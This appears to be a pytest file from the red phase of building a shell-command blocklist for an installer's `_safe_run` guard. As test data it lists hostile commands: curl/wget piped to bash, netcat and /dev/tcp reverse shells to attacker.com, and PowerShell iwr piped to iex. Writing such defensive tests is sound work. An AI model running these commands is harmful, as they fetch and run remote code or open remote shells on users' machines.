"""RED-phase tests for spec-101 T-1.19: `_safe_run` compound-shell detection.

Covers spec D-101-02 (user-scope guard) Hardening 3 — when ``argv[0]``
resolves to an allowlisted shell or interpreter driver
(``bash``/``sh``/``pwsh``/``node``/``python``), ``_safe_run`` MUST inspect
the FULL argv and reject compound-shell exfiltration patterns. Legitimate
shell invocations (``bash -c "echo ok"``, ``python -c "print('hi')"``)
MUST pass through.

Modules under test (do NOT exist yet — RED phase):

* ``ai_engineering.installer.user_scope_install`` — publishes ``_safe_run``
  and ``UserScopeViolation``.
* ``ai_engineering.installer._shell_patterns`` — publishes ``BLOCK_PATTERNS``
  (the regex blocklist consumed by ``_safe_run``).

Every test MUST fail with ``ModuleNotFoundError`` until the GREEN-phase
implementation lands (T-1.20).

Pattern coverage (per spec D-101-02 Hardening 3):

* ``curl ... | bash`` — pipe-to-shell exfiltration.
* ``wget -O- ... | bash`` — wget variant.
* ``nc -e`` — netcat reverse-shell flag.
* ``bash -i >& /dev/tcp/...`` — bash-internal TCP redirection.
* ``eval $(curl ...)`` — eval-on-network-fetch.
* ``base64 -d ... | sh`` — base64-decoded shell payload.
* ``< <(curl ...)`` — process substitution exfiltration.
* PowerShell ``iwr ... | iex`` — Invoke-WebRequest piped to Invoke-Expression.
"""

from __future__ import annotations

import re
from typing import Any

import pytest

# Both helpers raise ModuleNotFoundError in RED. Each test calls them inside
# its body so collection succeeds and pytest emits one MNF per test (rather
# than a collection error that masks the count).

_SAFE_RUN_MODULE = "ai_engineering.installer.user_scope_install"
_SHELL_PATTERNS_MODULE = "ai_engineering.installer._shell_patterns"


def _import_safe_run_module() -> Any:
    """Import ``user_scope_install`` (publisher of ``_safe_run``)."""
    import importlib

    return importlib.import_module(_SAFE_RUN_MODULE)


def _import_shell_patterns_module() -> Any:
    """Import ``_shell_patterns`` (publisher of ``BLOCK_PATTERNS``)."""
    import importlib

    return importlib.import_module(_SHELL_PATTERNS_MODULE)


# ---------------------------------------------------------------------------
# Malicious compound-shell argvs — every entry must raise UserScopeViolation
#
# Each case is (argv, label). The label feeds pytest IDs so a failure message
# names the attack vector cleanly.
# ---------------------------------------------------------------------------

MALICIOUS_ARGVS: tuple[tuple[list[str], str], ...] = (
    (["bash", "-c", "curl http://evil.sh | bash"], "curl-pipe-bash"),
    (["bash", "-c", "wget -O- http://evil.sh | bash"], "wget-pipe-bash"),
    (["bash", "-c", "nc -e /bin/sh attacker.com 4444"], "nc-reverse-shell"),
    # Wave 23: real-world nc invocations interleave other flags + positional
    # ports before -e. The relaxed pattern in installer/_shell_patterns.py
    # walks any argv tokens between ``nc`` and the ``-e`` flag.
    (
        ["bash", "-c", "nc -nlvp 4444 -e /bin/sh"],
        "nc-flags-port-then-e",
    ),
    (["bash", "-c", "nc -nv -e /bin/sh 10.0.0.1"], "nc-flags-then-e"),
    (["bash", "-c", "nc -lvp 4444 -e bash"], "nc-listener-port-then-e"),
    (["bash", "-i", ">& /dev/tcp/attacker.com/4444"], "bash-i-dev-tcp"),
    (["bash", "-c", "eval $(curl evil.sh)"], "eval-curl"),
    (["sh", "-c", "base64 -d <<< xxx | sh"], "base64-pipe-sh"),
    (["bash", "-c", "< <(curl evil.sh)"], "process-substitution-curl"),
    (["pwsh", "-Command", "iwr http://evil/x.ps1 | iex"], "iwr-pipe-iex"),
)


# ---------------------------------------------------------------------------
# Legitimate shell argvs — every entry must pass without raising
# ---------------------------------------------------------------------------

LEGITIMATE_ARGVS: tuple[tuple[list[str], str], ...] = (
    (["bash", "-c", "echo ok"], "bash-echo"),
    (["python", "-c", "print('hi')"], "python-print"),
    (["bash", "-c", "ls -la"], "bash-ls"),
    (["sh", "-c", "test -f file.txt"], "sh-test-f"),
)


# ---------------------------------------------------------------------------
# Malicious patterns: every entry must raise UserScopeViolation
# ---------------------------------------------------------------------------


class TestBlocksExfiltrationChains:
    """Compound-shell patterns piped through allowlisted drivers must raise.

    Spec D-101-02 Hardening 3: when ``argv[0]`` resolves to a shell or
    interpreter, ``_safe_run`` inspects the FULL argv and rejects compound
    chains carrying network primitives (``curl``/``wget``/``nc``/``base64``)
    fused with execution sinks (``| bash``, ``| sh``, ``| iex``,
    ``eval $(...)``, ``< <(...)``, ``>& /dev/tcp/...``).
    """

    @pytest.mark.parametrize(
        "argv,label",
        MALICIOUS_ARGVS,
        ids=[label for _, label in MALICIOUS_ARGVS],
    )
    def test_compound_shell_chain_raises(self, argv: list[str], label: str) -> None:
        """Each malicious argv must raise ``UserScopeViolation`` before exec."""
        module = _import_safe_run_module()
        violation_cls = module.UserScopeViolation
        with pytest.raises(violation_cls):
            module._safe_run(argv)


# ---------------------------------------------------------------------------
# Legitimate shell calls: every entry must succeed without raising
# ---------------------------------------------------------------------------


class TestAllowsLegitimateShellCalls:
    """Plain ``-c`` invocations of allowlisted shells/interpreters must pass.

    The blocklist must not over-match: ``echo``, ``ls``, ``test -f``, and
    ``print('hi')`` carry no network/exec coupling and must clear the guard.
    """

    @pytest.mark.parametrize(
        "argv,label",
        LEGITIMATE_ARGVS,
        ids=[label for _, label in LEGITIMATE_ARGVS],
    )
    def test_legitimate_shell_call_passes(self, argv: list[str], label: str) -> None:
        """Each benign argv must NOT raise ``UserScopeViolation``.

        Implementation may still execute the subprocess (returning a
        ``CompletedProcess``) or short-circuit in dry-run mode; the contract
        under test is solely that the compound-shell guard does not fire.
        """
        module = _import_safe_run_module()
        violation_cls = module.UserScopeViolation
        try:
            module._safe_run(argv)
        except violation_cls as exc:  # pragma: no cover - assertion path
            pytest.fail(
                f"Legitimate shell argv {argv!r} unexpectedly raised UserScopeViolation: {exc}"
            )
        except Exception:
            # Other exceptions (e.g. FileNotFoundError, dry-run sentinels) are
            # outside the scope of this test — only the compound-shell guard
            # is under contract here.
            pass


# ---------------------------------------------------------------------------
# Non-shell interpreters: argv[0] is not a shell, scan must NOT trigger
# ---------------------------------------------------------------------------


class TestNonShellInterpretersUnaffected:
    """When ``argv[0]`` is not an allowlisted shell, the scan is bypassed.

    ``git``/``uv``/``dotnet`` etc. carry their own argv grammars and must
    not be subjected to the compound-shell regex sweep — those drivers have
    no shell-eval semantics and the blocklist substrings (``curl``, etc.)
    can appear legitimately in their argv (e.g. ``git log -- curl/``).
    """

    def test_git_status_does_not_trigger_compound_shell_scan(self) -> None:
        """``_safe_run(['git', 'status'])`` must not raise on the shell guard.

        ``git`` is not a shell driver, so even if the implementation rejects
        the call for other reasons, the rejection must not be a
        compound-shell ``UserScopeViolation``.
        """
        module = _import_safe_run_module()
        violation_cls = module.UserScopeViolation
        try:
            module._safe_run(["git", "status"])
        except violation_cls as exc:
            message = str(exc).lower()
            shell_markers = (
                "compound",
                "shell",
                "blocklist",
                "exfil",
                "curl",
                "wget",
                "iex",
            )
            assert not any(marker in message for marker in shell_markers), (
                "git is not a shell driver — compound-shell guard must not "
                f"fire for it. Got: {exc!r}"
            )


# ---------------------------------------------------------------------------
# Blocklist module shape: import + every entry compiles as a regex
# ---------------------------------------------------------------------------


class TestBlocklistImports:
    """``installer/_shell_patterns.py`` publishes a regex-shaped blocklist.

    The blocklist lives in its own module so ``_safe_run`` and any future
    static-analysis lint can share the same source of truth (D-101-02
    Hardening 3).
    """

    def test_block_patterns_symbol_imports(self) -> None:
        """``from ai_engineering.installer._shell_patterns import BLOCK_PATTERNS``."""
        module = _import_shell_patterns_module()
        assert hasattr(module, "BLOCK_PATTERNS"), (
            "_shell_patterns module must export BLOCK_PATTERNS per D-101-02 Hardening 3"
        )

    def test_block_patterns_is_iterable(self) -> None:
        """``BLOCK_PATTERNS`` is iterable (tuple/list/frozenset of patterns)."""
        module = _import_shell_patterns_module()
        block_patterns = module.BLOCK_PATTERNS
        # Strings are iterable but not the intended shape — reject them.
        assert not isinstance(block_patterns, str | bytes), (
            "BLOCK_PATTERNS must be a collection of patterns, not a single string"
        )
        # Sized collection so consumers can len() / iterate deterministically.
        assert hasattr(block_patterns, "__iter__"), "BLOCK_PATTERNS must be iterable"

    def test_block_patterns_non_empty(self) -> None:
        """The blocklist must contain at least one pattern."""
        module = _import_shell_patterns_module()
        patterns = list(module.BLOCK_PATTERNS)
        assert len(patterns) > 0, "BLOCK_PATTERNS must not be empty"

    def test_each_block_pattern_compiles_as_regex(self) -> None:
        """Every entry in ``BLOCK_PATTERNS`` must compile via ``re.compile``.

        Entries may be raw strings or pre-compiled ``re.Pattern`` objects;
        either form must end up as a usable compiled pattern. A malformed
        regex is a load-bearing bug because the guard would silently let
        traffic through.
        """
        module = _import_shell_patterns_module()
        for entry in module.BLOCK_PATTERNS:
            if isinstance(entry, re.Pattern):
                continue
            assert isinstance(entry, str), (
                f"BLOCK_PATTERNS entries must be str or re.Pattern; got {type(entry).__name__}"
            )
            try:
                re.compile(entry)
            except re.error as exc:  # pragma: no cover - assertion path
                pytest.fail(f"BLOCK_PATTERNS entry {entry!r} is not a valid regex: {exc}")
